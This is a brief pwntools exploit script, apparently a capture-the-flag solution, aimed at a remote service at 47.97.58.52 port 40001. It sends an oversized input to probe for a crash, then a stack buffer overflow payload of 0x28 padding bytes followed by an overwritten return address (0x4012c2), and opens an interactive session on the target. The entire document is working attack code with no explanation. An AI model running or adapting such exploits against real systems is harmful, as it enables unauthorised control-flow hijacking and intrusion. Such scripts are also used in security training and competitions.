from pwn import *
context.log_level="debug"
s=remote("47.97.58.52",40001)
s.sendlineafter(b"her:\n",b"a"*0x100)
s.interactive()
s=remote("47.97.58.52",40001)
s.sendlineafter(b"her:\n",b"a"*0x28+p64(0x4012c2))
s.interactive()